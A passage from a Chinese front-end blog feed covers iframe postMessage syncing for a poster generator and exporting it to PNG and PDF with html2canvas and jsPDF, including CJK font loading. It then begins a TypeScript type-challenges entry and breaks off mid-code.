<span class="attr">payload</span>: <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(message)),</span><br><span class="line">      &#125;,</span><br><span class="line">      iframeSrc</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将渲染 Schema 同步到 iframe</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">syncSchema2Iframe</span> = (<span class="params">data?: ControllerFormData</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (dataSet.<span class="property">value</span>) &#123;</span><br><span class="line"><span class="comment">// 根据服务端获取的海报数据和 formData 生成渲染 schema</span></span><br><span class="line">    <span class="keyword">const</span> schema = <span class="title function_">generateSchema</span>(</span><br><span class="line">      dataSet.<span class="property">value</span>,</span><br><span class="line">      data || (controllerFormRef.<span class="property">value</span>?.<span class="property">formData</span> ?? &#123;&#125;)</span><br><span class="line">    );</span><br><span class="line">    <span class="title function_">postMessage2Iframe</span>(schema);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>相对应的 PosterRender 中应该有接受 Message 的代码：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> renderSchema = ref&lt;<span class="title class_">PosterSchema</span>&gt;([]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onReceiveMessage</span> = (<span class="params">event: MessageEvent</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">data</span>?.<span class="property">source</span> === <span class="string">&#x27;posterGeneratePage&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 拿到父组件传过来的 schema</span></span><br><span class="line">    renderSchema.<span class="property">value</span> = event.<span class="property">data</span>.<span class="property">payload</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, onReceiveMessage);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">onUnmounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;message&#x27;</span>, onReceiveMessage);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>对于 GeneratePage 来说，需要在如下三个阶段调用 <code>syncSchema2Iframe</code> 来通知 PosterRender 来实时渲染海报：</p><ul><li>组件挂载时</li><li>PosterRender 准备就绪时</li><li>表单数据更新时</li></ul><p>其中『PosterRender 准备就绪时』需要 PosterRender 主动通知父组件，实现代码如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">postMessage2Parent</span> = (<span class="params">message: <span class="built_in">any</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">parent</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">source</span>: <span class="string">&#x27;posterGenerateSubPage&#x27;</span>,</span><br><span class="line">        <span class="attr">payload</span>: <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(message)),</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  <span class="title function_">postMessage2Parent</span>(<span class="string">&#x27;ready&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>父组件获取消息的方式与 PosterRender 类似，不再复述。</p><h1 id="3-生成海报图片、PDF"><a href="#3-生成海报图片、PDF" class="headerlink" title="3. 生成海报图片、PDF"></a>3. 生成海报图片、PDF</h1><h2 id="3-1-生成图片"><a href="#3-1-生成图片" class="headerlink" title="3.1 生成图片"></a>3.1 生成图片</h2><p>使用 <a href="https://html2canvas.hertzen.com/">html2canvas</a> 可以将 DOM 元素渲染到 canvas 中从而实现对 DOM 元素进行『截图』的操作。其基本原理也很简单，通过读取已经渲染好的 DOM 元素的结构和样式信息，再通过内部实现的 canvas 渲染器完成将 DOM 绘制到离屏 canvas 上，最终对外暴露出 HTMLCanvasElement 对象。</p><p>对于页面上的 iframe 元素，通过获取 <code>contentDocument.body</code> 元素，html2canvas 也可以将其很好的渲染出来，实现代码如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> html2canvas <span class="keyword">from</span> <span class="string">&#x27;html2canvas&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onGenerateImage</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 获取到 iframe 中的 DOM 元素</span></span><br><span class="line">  <span class="keyword">const</span> iframeBody = iframeRef.<span class="property">value</span>?.<span class="property">contentDocument</span>?.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (iframeBody) &#123;</span><br><span class="line">    <span class="title function_">html2canvas</span>(iframeBody).<span class="title function_">then</span>(<span class="function">(<span class="params">canvas</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 创建图片</span></span><br><span class="line">      <span class="keyword">const</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">      img.<span class="property">src</span> = canvas.<span class="title function_">toDataURL</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">      <span class="comment">//  创建下载链接</span></span><br><span class="line">      <span class="keyword">const</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">      a.<span class="property">href</span> = img.<span class="property">src</span>;</span><br><span class="line">      a.<span class="property">download</span> = <span class="string">&#x27;poster.png&#x27;</span>;</span><br><span class="line">      <span class="comment">// 下载图片</span></span><br><span class="line">      a.<span class="title function_">click</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但是由于 html2canvas 的工作原理，其可以正确渲染的 DOM 内容有一定的局限性，需要注意如下几点：</p><ul><li>图片元素必须同源，否则会出现跨域问题</li><li>如果页面上有其他画布元素，且这些元素已被跨域内容污染，他们将不在被 html2canvas 读取</li><li>需要注意所支持渲染的 css 样式，具体查看<a href="https://html2canvas.hertzen.com/features">受支持的列表</a></li><li>无法读取插件内容，如 Flash 或 Java 小程序</li><li>低版本浏览器需要 Promise 的语法垫片</li><li><a href="https://html2canvas.hertzen.com/faq">需要注意 Canvas 的像素限制</a></li></ul><blockquote><p>注意：如果使用了 tailwind css 或者对 img 样式进行了重置，那么可能会造成生成的图片中的文本内容偏下，可以参考这个 <a href="https://github.com/niklasvh/html2canvas/issues/2775">issue</a> 进行处理，<strong>后文使用的 jsPDF 同样会出现此类问题</strong>。</p></blockquote><h2 id="3-2-生成-PDF"><a href="#3-2-生成-PDF" class="headerlink" title="3.2 生成 PDF"></a>3.2 生成 PDF</h2><p><a href="https://github.com/parallax/jsPDF">jsPDF</a> 是一个可以通过 JavaScript 在客户端环境下生成 PDF 的库，其基本原理是通过 JS 编程的方式生成 PDF 文件应有的组织形式，然后输出 base64 文件编码，提供给用户下载。</p><p>jsPDF 其内部提供了一套绘制 PDF 的 API，类似与 Canvas API（你甚至可以直接使用内部提供的  <a href="https://raw.githack.com/MrRio/jsPDF/master/docs/module-context2d.html"><code>context2d</code></a> 插件来使用 Canvas API 编写 jsPDF），来让用户以编程的方式向 PDF 写入内容，如文本、图片、表单项等；此外 jsPDF 还内置了 <a href="https://raw.githack.com/MrRio/jsPDF/master/docs/module-html.html#~html">html 插件</a>，可以直接将 HTML 内容转换为 PDF 内容。</p><p>因此，如果我们想将生成的海报转为 PDF 输出，那么有两种方案：</p><h3 id="方案一：将-HTML-内容转为图片后输出到-PDF"><a href="#方案一：将-HTML-内容转为图片后输出到-PDF" class="headerlink" title="方案一：将 HTML 内容转为图片后输出到 PDF"></a>方案一：将 HTML 内容转为图片后输出到 PDF</h3><p>这个实现方案相对简单，并且输出的 PDF 内容与现有的 HTML 内容较为符合，但这样生成的 PDF 内容实际为一张图片，如果使用 PDF 查看工具打开后，内部的文本以及超链接内容是无法进行互动的。</p><p>其过程大致为使用 html2canvas 将 HTML 内容转为图片后，再使用 jsPDF 的 <code>addImage</code> 将图片贴入到 PDF 中，最后再输出，其具体实现如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">generatePdf</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> iframeBody = iframeRef.<span class="property">value</span>?.<span class="property">contentDocument</span>?.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (iframeBody) &#123;</span><br><span class="line"><span class="comment">// 根据 HTML 生成 canvas</span></span><br><span class="line">    <span class="title function_">html2canvas</span>(iframeBody).<span class="title function_">then</span>(<span class="function">(<span class="params">canvas</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> imgData = canvas.<span class="title function_">toDataURL</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> pdf = <span class="keyword">new</span> <span class="title function_">jspdf</span>(&#123;</span><br><span class="line">        <span class="attr">orientation</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">        <span class="attr">unit</span>: <span class="string">&#x27;mm&#x27;</span>,</span><br><span class="line">        <span class="attr">format</span>: <span class="string">&#x27;a4&#x27;</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">const</span> imgProps = pdf.<span class="title function_">getImageProperties</span>(imgData);</span><br><span class="line">      <span class="comment">// 获取 pdf 单页宽高</span></span><br><span class="line">      <span class="keyword">const</span> pdfPageWidth = pdf.<span class="property">internal</span>.<span class="property">pageSize</span>.<span class="title function_">getWidth</span>();</span><br><span class="line">      <span class="keyword">const</span> pdfPageHeight = pdf.<span class="property">internal</span>.<span class="property">pageSize</span>.<span class="title function_">getHeight</span>();</span><br><span class="line">      <span class="comment">// 将图片宽高按照 pdf 宽度进行等比缩放</span></span><br><span class="line">      <span class="keyword">const</span> imageResizeWidth = pdfPageWidth;</span><br><span class="line">      <span class="keyword">const</span> imageResizeHeight =</span><br><span class="line">        (imgProps.<span class="property">height</span> * pdfPageWidth) / imgProps.<span class="property">width</span>;</span><br><span class="line">      <span class="comment">// 处理如果生成的图片高度超过 PDF 单页的高度，就要增加额外的 PDF 页</span></span><br><span class="line">      <span class="keyword">if</span> (imageResizeHeight &gt; pdfPageHeight) &#123;</span><br><span class="line">    <span class="comment">// 使用 position 来记录每次向 PDF 新页面添加截图时的 y 轴起始坐标</span></span><br><span class="line">        <span class="keyword">let</span> position = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">          pdf.<span class="title function_">addImage</span>(</span><br><span class="line">            imgData,</span><br><span class="line">            <span class="string">&#x27;PNG&#x27;</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            position,</span><br><span class="line">            imageResizeWidth,</span><br><span class="line">            imageResizeHeight</span><br><span class="line">          );</span><br><span class="line">          position -= pdfPageHeight;</span><br><span class="line">          <span class="comment">// 如果下一页添加截图时的 y 轴起始位置的绝对值高于图片本身，就说明下一页不需要添加图片了</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(position) &gt; imageResizeHeight) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">          &#125; </span><br><span class="line">          <span class="comment">// 否则，增加 PDF 页面</span></span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            pdf.<span class="title function_">addPage</span>();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pdf.<span class="title function_">addImage</span>(imgData, <span class="string">&#x27;PNG&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, imageResizeWidth, imageResizeHeight);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 导出 PDF</span></span><br><span class="line">      pdf.<span class="title function_">save</span>(<span class="string">&#x27;poster.pdf&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="方案二：使用-jsPDF-的-html-插件将-HTML-内容转为-PDF"><a href="#方案二：使用-jsPDF-的-html-插件将-HTML-内容转为-PDF" class="headerlink" title="方案二：使用 jsPDF 的 html 插件将 HTML 内容转为 PDF"></a>方案二：使用 jsPDF 的 <code>html</code> 插件将 HTML 内容转为 PDF</h3><p>jsPDF 提供了一个内置的 <code>html</code> 插件方法，可以将 HTML 内容直接输出为 PDF，其原理是通过内部调用 html2canvas 的能力将 HTML 内容转为 Canvas，然后 jsPDF 内部实现了从 Canvas 转换到 PDF 的能力。使用该方式相对于方案一较为复杂，并且内部的转换过程对外是一个黑盒，多层转换会存在一些预期之外的问题，但是好处是生成的 PDF 内容中的文本以及超链接等都是 PDF 的原生内容，是可交互的。</p><h4 id="字体问题"><a href="#字体问题" class="headerlink" title="字体问题"></a>字体问题</h4><p>jsPDF 并不提供 utf-8 编码的字体文件，因此在想 pdf 中添加中文、日文、韩文等字符时会乱码，如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pdf = <span class="keyword">new</span> <span class="title function_">jspdf</span>(&#123;</span><br><span class="line">  <span class="attr">orientation</span>: <span class="string">&#x27;portrait&#x27;</span>,</span><br><span class="line">  <span class="attr">unit</span>: <span class="string">&#x27;mm&#x27;</span>,</span><br><span class="line">  <span class="attr">format</span>: <span class="string">&#x27;a4&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line">pdf.<span class="title function_">text</span>(<span class="string">&#x27;[CN] 你好世界&#x27;</span>, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">pdf.<span class="title function_">text</span>(<span class="string">&#x27;[JP] こんにちは世界&#x27;</span>, <span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">pdf.<span class="title function_">text</span>(<span class="string">&#x27;[KR] 안녕하세요 세계&#x27;</span>, <span class="number">10</span>, <span class="number">30</span>);</span><br><span class="line">pdf.<span class="title function_">text</span>(<span class="string">&#x27;[EN] Hello world&#x27;</span>, <span class="number">10</span>, <span class="number">40</span>);</span><br><span class="line"><span class="comment">// 直接在新窗口中展示 PDF 内容</span></span><br><span class="line">pdf.<span class="title function_">output</span>(<span class="string">&#x27;pdfobjectnewwindow&#x27;</span>);</span><br></pre></td></tr></table></figure><p>会显示为：</p><p> <img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402231533193.png" alt=""></p><p>官方给出的方案是通过 <code>setFont</code> 方法让用户加载自定义字体，具体参考 <a href="https://artskydj.github.io/jsPDF/docs/index.html">官方文档的《Use of UTF-8/TTF》章节</a>。</p><p>选择开源字体在项目中使用是一个比较常用的方案，这里我们推荐使用 Adobe 的<a href="https://github.com/adobe-fonts/source-han-sans">思源黑体</a>，其在 Github 完全开源，是可以免费使用并允许二次开发的，关于如何挑选思源黑体的各个版本可以参考：<a href="https://blog.esunr.site/2024/02/d54f000429f5.html">《带你看懂思源字体的各个版本都有什么区别》</a></p><p>我们这里直接挑选思源黑体的中文字体集，并下载 <code>.ttf</code> 格式的可变字体：<a href="https://github.com/adobe-fonts/source-han-sans/blob/release/Variable/TTF/Subset/SourceHanSansCN-VF.ttf">下载地址 (16.9M)</a>。</p><p>下载完成之后我们可以按照如下方式加载字体，这样就可以正确的显示中文了：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fontPath <span class="keyword">from</span> <span class="string">&#x27;@client/assets/fonts/SourceHanSansCN-VF.ttf&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pdf = <span class="keyword">new</span> <span class="title function_">jspdf</span>(&#123;</span><br><span class="line">  <span class="attr">orientation</span>: <span class="string">&#x27;portrait&#x27;</span>,</span><br><span class="line">  <span class="attr">unit</span>: <span class="string">&#x27;mm&#x27;</span>,</span><br><span class="line">  <span class="attr">format</span>: <span class="string">&#x27;a4&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 下载字体文件</span></span><br><span class="line"><span class="keyword">const</span> fontRes = <span class="keyword">await</span> <span class="title function_">fetch</span>(fontPath);</span><br><span class="line"><span class="comment">// 将字体文件转为 Base64 编码</span></span><br><span class="line"><span class="keyword">const</span> fontBase64String = <span class="keyword">await</span> fontRes.<span class="title function_">blob</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">blob</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">    reader.<span class="property">onload</span> = <span class="function">() =&gt;</span> <span class="title function_">resolve</span>(reader.<span class="property">result</span>);</span><br><span class="line">    reader.<span class="property">onerror</span> = reject;</span><br><span class="line">    reader.<span class="title function_">readAsDataURL</span>(blob);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">pdf.<span class="title function_">addFileToVFS</span>(</span><br><span class="line">  <span class="string">&#x27;SourceHanSansCN-VF&#x27;</span>,</span><br><span class="line">  (fontBase64String <span class="keyword">as</span> <span class="built_in">string</span>).<span class="title function_">replace</span>(<span class="string">&#x27;data:font/ttf;base64,&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">);</span><br><span class="line">pdf.<span class="title function_">addFont</span>(<span class="string">&#x27;SourceHanSansCN-VF&#x27;</span>, <span class="string">&#x27;SourceHanSansCN-VF&#x27;</span>, <span class="string">&#x27;normal&#x27;</span>);</span><br><span class="line">pdf.<span class="title function_">setFont</span>(<span class="string">&#x27;SourceHanSansCN-VF&#x27;</span>);</span><br><span class="line">pdf.<span class="title function_">text</span>(<span class="string">&#x27;[CN] 你好世界&#x27;</span>, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">pdf.<span class="title function_">text</span>(<span class="string">&#x27;[JP] こんにちは世界&#x27;</span>, <span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">pdf.<span class="title function_">text</span>(<span class="string">&#x27;[KR] 안녕하세요 세계&#x27;</span>, <span class="number">10</span>, <span class="number">30</span>);</span><br><span class="line">pdf.<span class="title function_">text</span>(<span class="string">&#x27;[EN] Hello world&#x27;</span>, <span class="number">10</span>, <span class="number">40</span>);</span><br><span class="line"><span class="comment">// 直接在新窗口中展示 PDF 内容</span></span><br><span class="line">pdf.<span class="title function_">output</span>(<span class="string">&#x27;pdfobjectnewwindow&#x27;</span>);</span><br></pre></td></tr></table></figure><p>显示效果如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202402231550332.png" alt=""></p><p>在引入字体时需要注意以下几点：</p><ul><li>即使引入的是可变字体，也无法设置字重；</li><li>jsPDF 仅支持 turetype font，也就是 <code>.ttf</code> 后缀格式的字体文件；</li><li>思源黑体的中文字体集中包含了日文字符，但是并不包含韩文，所以韩文是不显示的；</li><li>如果使用 html 生成 pdf，<code>setFont</code> API 是不生效的，<code>html</code> 方法在调用时提供了一个额外的 <code>fontFaces</code> 参数来让用户设置字体。</li></ul><h3 id="方法实现"><a href="#方法实现" class="headerlink" title="方法实现"></a>方法实现</h3><p>解决了字体问题后，就可以来实现 HTML 转 PDF 的方法了，具体代码如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">generatePdf</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> iframeBody = iframeRef.<span class="property">value</span>?.<span class="property">contentDocument</span>?.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (iframeBody) &#123;</span><br><span class="line">    <span class="keyword">const</span> pdf = <span class="keyword">new</span> <span class="title function_">jspdf</span>(&#123;</span><br><span class="line">      <span class="attr">orientation</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">      <span class="attr">unit</span>: <span class="string">&#x27;mm&#x27;</span>,</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&#x27;a4&#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 在生成前需要指定目标 HTML 中所有元素的字体，否则会乱码</span></span><br><span class="line">    <span class="keyword">const</span> style = iframeBody.<span class="property">ownerDocument</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">    style.<span class="property">innerHTML</span> = <span class="string">&quot;* &#123; font-family: &#x27;SourceHanSansCN-VF&#x27;; &#125;&quot;</span>;</span><br><span class="line">    iframeBody.<span class="title function_">appendChild</span>(style);</span><br><span class="line">    <span class="comment">// 根据 HTML 生成 PDF</span></span><br><span class="line">    pdf.<span class="title function_">html</span>(iframeBody, &#123;</span><br><span class="line">      <span class="comment">// 声明字体</span></span><br><span class="line">      <span class="attr">fontFaces</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">family</span>: <span class="string">&#x27;SourceHanSansCN-VF&#x27;</span>,</span><br><span class="line">          <span class="attr">src</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">url</span>: fontPath,</span><br><span class="line">              <span class="attr">format</span>: <span class="string">&#x27;truetype&#x27;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">          ],</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">      <span class="comment">// 输入到 PDF 中的内容的宽度，这里设置为 pdf 页面的宽度</span></span><br><span class="line">      <span class="attr">width</span>: pdf.<span class="property">internal</span>.<span class="property">pageSize</span>.<span class="title function_">getWidth</span>(),</span><br><span class="line">      <span class="comment">// 渲染 HTML 时的视口宽度，会影响渲染时的实际容器大小，这里直接设置为当前 iframe 的宽度</span></span><br><span class="line">      <span class="attr">windowWidth</span>: iframeBody.<span class="property">clientWidth</span>,</span><br><span class="line">      <span class="attr">callback</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        style.<span class="title function_">remove</span>();</span><br><span class="line">        pdf.<span class="title function_">save</span>(<span class="string">&#x27;posterHtml.pdf&#x27;</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意事项：</p><ul><li>jsPDF 在将 html 转为 PDF 时调用了 html2canvas，因此 html2canvas 转化过程中存在的问题，如样式兼容性、资源跨域等问题也会出现在 jsPDF 中；</li><li>转换出来的 PDF 中文字如果有下沉或者偏移的情况，详见 3.1 章节中的注意事项，也有可能是字体问题。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 技术调研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 可视化 </tag>
            
            <tag> PDF </tag>
            
            <tag> HTML2Canvas </tag>
            
            <tag> jsPDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript 类型体操通关记录</title>
      <link href="/2024/02/467da063c417.html"/>
      <url>/2024/02/467da063c417.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-简单"><a href="#1-简单" class="headerlink" title="1. 简单"></a>1. 简单</h1><h2 id="Pick"><a href="#Pick" class="headerlink" title="Pick"></a>Pick</h2><p><a href="https://github.com/type-challenges/type-challenges/blob/main/questions/00004-easy-pick/README.zh-CN.md">Source</a></p><p><code>Pick</code> 是 TypeScript 中的一个内置工具类型，可以从某个类型中提取出来几个特定的属性 Key 来创建一个新的类型：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Todo</span> &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">description</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">completed</span>: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">TodoPreview</span> = <span class="title class_">Pick</span>&lt;<span class="title class_">Todo</span>, <span class="string">&quot;title&quot;</span> | <span 